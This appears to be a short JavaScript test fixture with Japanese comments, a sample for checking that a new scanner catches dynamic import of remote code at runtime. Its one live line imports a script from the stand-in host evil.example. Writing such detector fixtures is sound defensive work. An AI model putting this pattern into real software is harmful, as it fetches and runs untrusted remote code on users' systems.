'use strict';
// fixture: 動的な取り込み（独立検証の実測3）。実行時にリモートコードを引き込む経路。
// 注: この検体のコメントに検査対象の字面を書かないこと。
//     コメントで引っかかると「新しい検査が効いた」ことの証明にならない。
function load(u) { return import(u); }
load("//evil.example/x.js");
